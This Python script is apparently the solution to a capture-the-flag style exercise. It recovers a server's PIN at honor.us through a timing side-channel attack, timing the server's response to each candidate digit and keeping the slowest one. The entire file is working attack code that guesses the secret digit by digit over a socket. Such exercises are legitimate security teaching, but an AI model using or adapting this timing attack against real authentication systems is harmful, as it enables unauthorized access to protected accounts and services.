import socket
import time

SERVER_PORT = 61234
SERVER_HOSTNAME = "honor.us"

# Convert the hostname to an IP address
SERVER_IP = socket.gethostbyname(SERVER_HOSTNAME)

# Implements the guessing algorithm described in the solution README
def run_bruteforce(ip, port):
  
  # Open the connection to honor.us
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((ip, port))

    sock.recv(1024)  # Discard initial message

    partial_match = ""  # Stores the partially recovered PIN
    
    while True:
      best_guess_digit = ""  # Stores the digit with the longest execution time so far
      best_guess_time = 0  # The longest execution time so far

      for i in range(10):
        # Calculate the time it took to check the PIN
        pin = f"{partial_match}{i}\n"  # Add new digit 0-9 to the PIN so far
        start = time.perf_counter()  # Start timer
        sock.sendall(pin.encode())  # Send the pin; note the socket expects a byte string, so the pin is encoded
        response = sock.recv(4)  # Receive response from the server
        end = time.perf_counter()  # End timer

        # Check if we have a good pin and return if so
        result = response == b'PASS'
        if result:
          return pin

        # Calculate time to send/recv
        guess_time = end - start

        # If time is longer, change our best guess
        if guess_time > best_guess_time:
          best_guess_time = guess_time
          best_guess_digit = i
      
      # After running all 10 digits, save our best guess as part of the PIN
      partial_match += str(best_guess_digit)
      print(f"Partial match: {partial_match}, {best_guess_digit}, {best_guess_time}")

if __name__ == "__main__":
  # Times the bruteforce function
  bruteforce_start_time = time.perf_counter()
  pin = run_bruteforce(SERVER_IP, SERVER_PORT)
  bruteforce_end_time = time.perf_counter()

  # PIN recovered, output it and the total time
  print(f"Found PIN: {pin}", flush=True)
  print(f"Total Time: {round(bruteforce_end_time - bruteforce_start_time, 2)} seconds", flush=True)